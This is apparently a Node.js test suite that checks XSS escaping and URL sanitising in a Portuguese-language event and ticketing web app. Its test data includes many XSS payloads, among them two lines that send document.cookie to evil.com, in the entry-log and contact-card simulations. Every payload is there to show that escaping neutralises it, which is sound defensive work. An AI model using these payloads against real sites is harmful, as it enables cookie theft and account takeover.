/**
 * P0-SEC-01 — Automated XSS Fix Verification
 * 
 * Tests:
 * 1. escapeHTML() function correctness
 * 2. sanitizeURL() function correctness
 * 3. Real template rendering contexts (simulated innerHTML)
 * 4. Attribute injection prevention
 * 5. Regression checks (normal text preserved)
 * 
 * Run: node tests/xss-verification.js
 */

'use strict';

// ══════════════════════════════════════════════════════════════
// 1. Import the functions from each file (extract them inline)
// ══════════════════════════════════════════════════════════════
function escapeHTML(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function sanitizeURL(url) {
  if (!url) return '';
  const s = String(url).trim();
  if (/^https?:\/\//i.test(s)) return s;
  if (/^[a-z0-9\-._~:/?#[\]@!$&'()*+,;=%]+$/i.test(s) && !s.includes(':')) return s;
  return '';
}

// ══════════════════════════════════════════════════════════════
// Test framework
// ══════════════════════════════════════════════════════════════
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function assert(condition, description) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log('  ✓ ' + description);
  } else {
    failedTests++;
    failures.push(description);
    console.log('  ✗ FAIL: ' + description);
  }
}

function assertEqual(actual, expected, description) {
  totalTests++;
  if (actual === expected) {
    passedTests++;
    console.log('  ✓ ' + description);
  } else {
    failedTests++;
    failures.push(description + ' — expected: ' + JSON.stringify(expected) + ', got: ' + JSON.stringify(actual));
    console.log('  ✗ FAIL: ' + description);
    console.log('    expected: ' + JSON.stringify(expected));
    console.log('    got:      ' + JSON.stringify(actual));
  }
}

// ══════════════════════════════════════════════════════════════
// 2. escapeHTML Tests
// ══════════════════════════════════════════════════════════════
console.log('\n=== Test Suite 1: escapeHTML() ===');

// Basic character escaping
assertEqual(escapeHTML('<'), '&lt;', 'Escapes <');
assertEqual(escapeHTML('>'), '&gt;', 'Escapes >');
assertEqual(escapeHTML('&'), '&amp;', 'Escapes &');
assertEqual(escapeHTML('"'), '&quot;', 'Escapes double quote');
assertEqual(escapeHTML("'"), '&#39;', 'Escapes single quote');

// Normal text preservation
assertEqual(escapeHTML('Festa do Rock 2025'), 'Festa do Rock 2025', 'Normal text preserved');
assertEqual(escapeHTML('João da Silva'), 'João da Silva', 'Accented characters preserved');
assertEqual(escapeHTML('R$ 1.500,00'), 'R$ 1.500,00', 'Currency format preserved');
assertEqual(escapeHTML('user@email.com'), 'user@email.com', 'Email preserved');
assertEqual(escapeHTML('(11) 99999-0000'), '(11) 99999-0000', 'Phone preserved');
assertEqual(escapeHTML('CPF: 123.456.789-00'), 'CPF: 123.456.789-00', 'CPF preserved');

// XSS payload neutralization
assertEqual(
  escapeHTML('<script>alert(1)</script>'),
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  'Script tag neutralized'
);
assertEqual(
  escapeHTML('<img src=x onerror=alert(1)>'),
  '&lt;img src=x onerror=alert(1)&gt;',
  'Img onerror neutralized'
);
assertEqual(
  escapeHTML('<svg onload=alert(1)>'),
  '&lt;svg onload=alert(1)&gt;',
  'SVG onload neutralized'
);
assertEqual(
  escapeHTML('" onmouseover="alert(1)" data-x="'),
  '&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;',
  'Attribute injection neutralized'
);
assertEqual(
  escapeHTML("' onmouseover='alert(1)' data-x='"),
  "&#39; onmouseover=&#39;alert(1)&#39; data-x=&#39;",
  'Single-quote attribute injection neutralized'
);
assertEqual(
  escapeHTML('<iframe src="javascript:alert(1)">'),
  '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;',
  'Iframe injection neutralized'
);

// Edge cases
assertEqual(escapeHTML(null), '', 'null returns empty string');
assertEqual(escapeHTML(undefined), '', 'undefined returns empty string');
assertEqual(escapeHTML(''), '', 'Empty string returns empty string');
assertEqual(escapeHTML(0), '0', 'Number 0 returns "0"');
assertEqual(escapeHTML(42), '42', 'Number returns string');

// Combined dangerous characters
assertEqual(
  escapeHTML('Name: <b>"Test"</b> & \'more\''),
  'Name: &lt;b&gt;&quot;Test&quot;&lt;/b&gt; &amp; &#39;more&#39;',
  'Combined special characters all escaped'
);

// ══════════════════════════════════════════════════════════════
// 3. sanitizeURL Tests
// ══════════════════════════════════════════════════════════════
console.log('\n=== Test Suite 2: sanitizeURL() ===');

// Valid URLs
assertEqual(sanitizeURL('https://example.com/image.png'), 'https://example.com/image.png', 'HTTPS URL allowed');
assertEqual(sanitizeURL('http://example.com/image.png'), 'http://example.com/image.png', 'HTTP URL allowed');

// Relative paths (local assets)
assertEqual(sanitizeURL('imagens/offcampushexa.png'), 'imagens/offcampushexa.png', 'Relative path allowed');

// Dangerous protocols blocked
assertEqual(sanitizeURL('javascript:alert(1)'), '', 'javascript: protocol blocked');
assertEqual(sanitizeURL('javascript:alert(document.cookie)'), '', 'javascript: cookie theft blocked');
assertEqual(sanitizeURL('data:text/html,<script>alert(1)</script>'), '', 'data: protocol blocked');
assertEqual(sanitizeURL('vbscript:alert(1)'), '', 'vbscript: protocol blocked');
assertEqual(sanitizeURL('  javascript:alert(1)  '), '', 'javascript: with whitespace blocked');

// Edge cases
assertEqual(sanitizeURL(''), '', 'Empty string returns empty');
assertEqual(sanitizeURL(null), '', 'null returns empty');
assertEqual(sanitizeURL(undefined), '', 'undefined returns empty');

// ══════════════════════════════════════════════════════════════
// 4. Template Context Tests (simulated real rendering)
// ══════════════════════════════════════════════════════════════
console.log('\n=== Test Suite 3: Template Context Simulations ===');

// Simulate admin.js renderEventos with malicious event name
{
  const ev = {
    nome: '<img src=x onerror=alert("XSS")>',
    tipo: '"><script>alert(1)</script>',
    local: "Venue' onclick='alert(1)",
  };

  const result = '<tr><td><b>' + escapeHTML(ev.nome) + '</b><div>' + escapeHTML(ev.tipo) + '</div></td><td>' + escapeHTML(ev.local) + '</td></tr>';

  assert(!result.includes('<img src=x'), 'Event name: img tag not present in rendered HTML');
  assert(!result.includes('<script>'), 'Event type: script tag not present in rendered HTML');
  assert(!result.includes("onclick='alert"), 'Event venue: onclick not present');
  assert(result.includes('&lt;img'), 'Event name: escaped img tag visible');
}

// Simulate main.js openEvento with malicious image URL
{
  const ev = {
    img: 'javascript:alert(document.cookie)',
    nome: 'Normal Event',
  };

  const imgSrc = sanitizeURL(ev.img);
  assertEqual(imgSrc, '', 'Malicious image URL blocked');

  const result = '<img src="' + sanitizeURL(ev.img) + '" alt="' + escapeHTML(ev.nome) + '">';
  assert(!result.includes('javascript:'), 'No javascript: protocol in img src');
  assert(result.includes('src=""'), 'Malicious URL replaced with empty src');
}

// Simulate entry log with malicious guest name
{
  const e = {
    hora: '14:30',
    nome: '<script>document.location="http://evil.com?c="+document.cookie</script>',
    evento: 'Fest<img src=x onerror=alert(1)>ival',
    codigo: '"><script>alert(1)</script>',
  };

  const result = '<div class="entry-row"><span class="time">' + escapeHTML(e.hora) + '</span><span class="name">' + escapeHTML(e.nome) + '</span><span class="badge">' + escapeHTML(e.evento.substring(0,14)) + '</span><span>' + escapeHTML(e.codigo) + '</span></div>';

  assert(!result.includes('<script>'), 'Entry log: no script tag');
  assert(!result.includes('onerror'), 'Entry log: no onerror handler');
  assert(result.includes('&lt;script&gt;'), 'Entry log: script tag escaped in guest name');
}

// Simulate HTML attribute title injection
{
  const evNome = '" onmouseover="alert(1)" x="';
  const result = '<div class="progress-label" title="' + escapeHTML(evNome) + '">' + escapeHTML(evNome.substring(0,22)) + '</div>';
  assert(!result.includes('onmouseover'), 'Attribute injection: no onmouseover in title attr');
  assert(result.includes('&quot;'), 'Attribute injection: quotes escaped in title');
}

// Simulate contact card with malicious obs field
{
  const c = {
    nome: 'José',
    obs: '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
  };
  const result = '<div class="contact-card"><div class="contact-name">' + escapeHTML(c.nome) + '</div><div>' + escapeHTML(c.obs) + '</div></div>';
  
  assert(!result.includes('<script>'), 'Contact obs: no script tag in card');
  assert(result.includes('&lt;script&gt;'), 'Contact obs: script tag properly escaped');
}

// Simulate audit log with malicious action
{
  const l = {
    hora: '2025-06-15 14:30',
    usuario: 'admin<img src=x onerror=alert(1)>',
    acao: 'Criou evento "<script>alert(1)</script>"',
  };
  const result = '<div class="audit-row"><span class="time">' + escapeHTML(l.hora) + '</span><span class="who">' + escapeHTML(l.usuario) + '</span><span class="what">' + escapeHTML(l.acao) + '</span></div>';
  assert(!result.includes('<img src=x'), 'Audit: no img tag in user name');
  assert(!result.includes('<script>'), 'Audit: no script tag in action');
}

// Simulate purchase confirmation with malicious data
{
  const pedido = {
    eventName: '<script>alert("XSS")</script>',
    batchName: '"><img src=x onerror=alert(1)>',
  };
  const result = '<div class="tk-row"><span>Evento:</span><b>' + escapeHTML(pedido.eventName) + '</b></div><div class="tk-row"><span>Ingresso:</span><b>' + escapeHTML(pedido.batchName) + '</b></div>';
  assert(!result.includes('<script>'), 'Purchase: no script in event name');
  assert(!result.includes('onerror'), 'Purchase: no onerror in batch name');
}

// Simulate select option injection
{
  const evNome = '</option><script>alert(1)</script><option>';
  const result = '<option>' + escapeHTML(evNome) + '</option>';
  assert(!result.includes('<script>'), 'Select option: no script injection');
}

// ══════════════════════════════════════════════════════════════
// 5. File-level verification
// ══════════════════════════════════════════════════════════════
console.log('\n=== Test Suite 4: File-Level Verification ===');

const fs = require('fs');
const path = require('path');
const projectRoot = path.resolve(__dirname, '..');

const filesToCheck = [
  { file: 'js/admin.js', label: 'admin.js' },
  { file: 'js/main.js', label: 'main.js' },
  { file: 'script.js', label: 'script.js' },
];

filesToCheck.forEach(function(cfg) {
  const fullPath = path.join(projectRoot, cfg.file);
  let content;
  try {
    content = fs.readFileSync(fullPath, 'utf-8');
  } catch (e) {
    assert(false, cfg.label + ': File readable');
    return;
  }

  assert(true, cfg.label + ': File readable');

  // Check escapeHTML function exists
  assert(
    content.includes('function escapeHTML(str)') || content.includes('function escapeHTML('),
    cfg.label + ': escapeHTML function defined'
  );

  // Check sanitizeURL function exists
  assert(
    content.includes('function sanitizeURL(url)') || content.includes('function sanitizeURL('),
    cfg.label + ': sanitizeURL function defined'
  );

  // Check escapeHTML is actually used
  var escapeUsages = (content.match(/escapeHTML\(/g) || []).length;
  assert(
    escapeUsages > 5,
    cfg.label + ': escapeHTML used ' + escapeUsages + ' times (expected >5)'
  );

  // Check for unescaped user-data fields in innerHTML/insertAdjacentHTML templates
  var innerHTMLBlocks = content.split(/\.innerHTML\s*=/).slice(1);
  var rawFieldsFound = [];
  
  innerHTMLBlocks.forEach(function(block) {
    var templateEnd = block.indexOf(';\n');
    if (templateEnd < 0) templateEnd = block.indexOf(';\r');
    var template = block.substring(0, templateEnd > 0 ? templateEnd : 500);
    
    // Skip static assignments like '' or static HTML
    if (/^\s*['"]/.test(template) && !template.includes('${')) return;
    if (/^\s*''/.test(template)) return;

    // Find ${something.field} where field is a known user-data field
    var regex = /\$\{(?!escapeHTML\()(?!sanitizeURL\()(?!fmt_brl\()(?!Math\.)(?!\d)([\w.]+\.(?:nome|email|desc|regras|local|tipo|cat|cargo|obs|tel|cpf|usuario|acao|codigo|evento|perfil))/g;
    var m;
    while ((m = regex.exec(template)) !== null) {
      rawFieldsFound.push(m[1]);
    }
  });

  // Also check insertAdjacentHTML
  var insertBlocks = content.split(/\.insertAdjacentHTML\([^,]+,\s*`/).slice(1);
  insertBlocks.forEach(function(block) {
    var templateEnd = block.indexOf('`);');
    var template = block.substring(0, templateEnd > 0 ? templateEnd : 500);
    var regex = /\$\{(?!escapeHTML\()(?!sanitizeURL\()(?!fmt_brl\()(?!Math\.)(?!\d)([\w.]+\.(?:nome|email|desc|regras|local|tipo|cat|cargo|obs|tel|cpf|usuario|acao|codigo|evento|perfil))/g;
    var m;
    while ((m = regex.exec(template)) !== null) {
      rawFieldsFound.push(m[1]);
    }
  });

  var unique = rawFieldsFound.filter(function(v, i, a) { return a.indexOf(v) === i; });
  if (unique.length > 0) {
    assert(false, cfg.label + ': No unescaped user-data fields in innerHTML (found raw: ' + unique.join(', ') + ')');
  } else {
    assert(true, cfg.label + ': No unescaped user-data fields in innerHTML templates');
  }

  // Check img src uses sanitizeURL
  if (content.includes('ev.img')) {
    var hasSanitizedImg = content.includes('sanitizeURL(ev.img)');
    assert(hasSanitizedImg, cfg.label + ': Image URLs use sanitizeURL()');
  }
});

// ══════════════════════════════════════════════════════════════
// 6. Summary
// ══════════════════════════════════════════════════════════════
console.log('\n===========================================');
console.log('Total: ' + totalTests + ' | Passed: ' + passedTests + ' | Failed: ' + failedTests);
if (failedTests > 0) {
  console.log('\nFailures:');
  failures.forEach(function(f) { console.log('  - ' + f); });
  console.log('\nRESULT: SOME TESTS FAILED');
  process.exit(1);
} else {
  console.log('\nRESULT: ALL TESTS PASSED');
  process.exit(0);
}
